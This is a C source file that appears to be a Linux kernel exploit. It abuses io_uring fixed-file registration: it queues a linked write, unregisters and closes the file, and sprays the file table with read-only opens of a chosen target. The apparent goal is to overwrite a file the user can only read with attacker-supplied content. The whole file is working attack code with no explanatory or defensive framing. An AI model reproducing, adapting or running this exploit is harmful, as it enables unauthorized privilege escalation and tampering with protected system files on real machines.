#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/poll.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <assert.h>

#include "liburing.h"

int group_id = 1337;
int victim_fd = 0;
int control_pipes[2];
struct io_uring ring;
char buffer[10];
char payload[1024*1024*100];
int payload_len = 0;
const char * target_path = NULL;

void consume() {
    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(&ring, &cqe);
    printf("consuming..\n");
    if (ret < 0) {
        printf("Error when consuming: %s\n",
                strerror(-ret));
        return;
    }
    if (!cqe) return;
    /* Now that we have the CQE, let's process the data */
    if (cqe->res < 0) {
        printf("Error in async operation: %s\n", strerror(-cqe->res));
        ;
    }
    printf("Result: %d\n", cqe->res);
    printf("%lld\n", cqe->user_data);
    io_uring_cqe_seen(&ring, cqe);
}

void * work(void *) {
    struct io_uring_sqe * sqe;
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, control_pipes[0], buffer, 1, 0);
    sqe->flags |= IOSQE_IO_LINK;
    sqe->user_data = 1;


    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_write(sqe, 0, payload, payload_len, 0);
    sqe->flags |= IOSQE_FIXED_FILE | IOSQE_IO_LINK;
    sqe->user_data = 2;

    io_uring_submit(&ring);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("usage: %s <target file> <source>", argv[0]);
    }
    int fd = open(argv[2], 0);
    assert(fd >= 0);

    payload_len = read(fd, payload, sizeof(payload));
    assert(payload_len >= 1);
    close(fd);
    target_path = argv[1];

    struct io_uring_params params;
    memset(&params, 0, sizeof(params));
    params.flags |= IORING_SETUP_SQPOLL;
    params.sq_thread_idle = 3000;

    if (io_uring_queue_init_params(128, &ring, &params) < 0) {
        perror("io_uring_init_failed...\n");
        exit(1);
    }

    int ret;
    ret = pipe(control_pipes);
    assert(ret == 0);

    int fds[1024000];
    for (int i = 0; i < 1024000; i++) {
        int fd = open(target_path, 0);
        assert( fd>=0 );
        fds[i] = fd;
        if (i == 102412)
            victim_fd = open("./write", O_RDWR|O_CREAT, 0777);
    }
    for (int i = 0; i < 1024000; i+=2) {
        close(fds[i]);
    }
    
    assert(victim_fd >= 0);
    ret = io_uring_register_files(&ring, &victim_fd, 1);
    assert(ret == 0);
    pthread_t thread;
    pthread_create(&thread, NULL, work, NULL);

    io_uring_unregister_files(&ring);
    close(victim_fd);

    printf("spraying..\n");
    for (int i = 0; i < 1024000; i+=2) {
        int fd = open(target_path, 0);
        assert(fd >= 0);
    }
    write(control_pipes[1], "1", 1);
    consume();
    consume();
    //close(pipes[1]);
}

